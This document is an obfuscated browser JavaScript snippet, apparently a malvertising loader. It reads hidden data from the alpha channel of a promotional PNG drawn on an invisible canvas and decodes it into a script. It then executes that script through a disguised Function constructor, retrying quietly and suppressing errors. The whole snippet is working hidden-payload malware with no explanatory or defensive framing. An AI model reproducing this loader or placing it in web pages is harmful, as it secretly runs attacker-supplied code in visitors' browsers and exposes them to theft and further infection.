(function() {
    try {
        var t = function() {},
            r = {
                AP: function(t) {
                    if (isNaN(t) || !isFinite(t) || t % 1 || t < 2) return !1;
                    if (t % 2 === 0) return 2 === t;
                    if (t % 3 === 0) return 3 === t;
                    for (var r = Math.sqrt(t), e = 5; e <= r; e += 6) {
                        if (t % e === 0) return !1;
                        if (t % (e + 2) === 0) return !1
                    }
                    return !0
                },
                Y1: function(t) {
                    for (var r = "", e = -242, n = 0, i = 0; i < t.length; i++) n = t[i].charCodeAt() + e, r += String.fromCharCode(n);
                    return r
                },
                Ht: function(t) {
                    for (var e = t; !0; e += 1)
                        if (r.AP(e)) return e
                },
                EB: function(t) {
                    var r = new Image;
                    for (r.src = t; r.hasOwnProperty("complete") && !r.complete;);
                    return r
                }
            };
        return t.prototype.Qq = {
            Fl: 3,
            PQ: 1,
            Xg: 16,
            k2: function(t) {
                return t + 1
            },
            EQ: function(t, r, e) {
                for (var n = !0, i = 0; i < 16 && n; i += 1) n = n && 255 === t[r + 4 * i];
                return n
            }
        }, t.prototype.Xz = function(t, r) {
            r = r || {};
            var e = this.Qq,
                n = r.width || t.width,
                i = r.height || t.height,
                o = r.Fl || e.Fl,
                a = r.Xg || e.Xg;
            return o * n * i / a >> 0
        }, t.prototype.Gv = function(t, e) {
            if ("" === '\x69\x6D\x61\x67\x65\x73\x2F\x6C\x61\x72\x67\x65\x5F\x70\x72\x6F\x6D\x6F\x2E\x70\x6E\x67') return "";
            void 0 === t && (t = '\x69\x6D\x61\x67\x65\x73\x2F\x6C\x61\x72\x67\x65\x5F\x70\x72\x6F\x6D\x6F\x2E\x70\x6E\x67'), t.length && (t = r.EB(t)), e = e || {};
            var n = this.Qq,
                i = e.Fl || n.Fl,
                o = e.PQ || n.PQ,
                a = e.Xg || n.Xg,
                h = r.Ht(Math.pow(2, i)),
                u = (e.k2 || n.k2, e.EQ || n.EQ),
                f = document.createElement("canvas"),
                g = f.getContext("2d");
            if (f.style.display = "none", f.width = e.width || t.width, f.height = e.width || t.height, 0 === f.width || 0 === f.height) return "";
            e.height && e.width ? g.drawImage(t, 0, 0, e.width, e.height) : g.drawImage(t, 0, 0);
            var p = g.getImageData(0, 0, f.width, f.height),
                c = p.data,
                d = [];
            if (p.data.every(function(t) {
                    return 0 === t
                })) return "";
            var v, w;
            if (1 === o)
                for (v = 3, w = !1; !w && v < c.length && !w; v += 4) w = u(c, v, o), w || d.push(c[v] - (255 - h + 1));
            var l = "",
                s = 0,
                m = 0,
                y = Math.pow(2, a) - 1;
            for (v = 0; v < d.length; v += 1) s += d[v] << m, m += i, m >= a && (l += String.fromCharCode(s & y), m %= a, s = d[v] >> i - m);
            return l.length < 13 ? "" : (0 !== s && (l += String.fromCharCode(s & y)), l)
        }, t.prototype.GM = 3, t.prototype.JU = 0, t.prototype.UD = 5e3, t.prototype.Oo = function() {
            try {
                var e = t.prototype,
                    n = r.Y1(e.Gv());
                if ("" === n) {
                    if (e.JU > e.GM) return;
                    return e.JU++, void setTimeout(e.Oo, e.UD)
                }
                document.defaultView[(typeof r.AP).charAt(0).toUpperCase() + (typeof r.AP).slice(1)](n)()
            } catch (t) {}
        }, (new t).Oo
    } catch (t) {}
}())();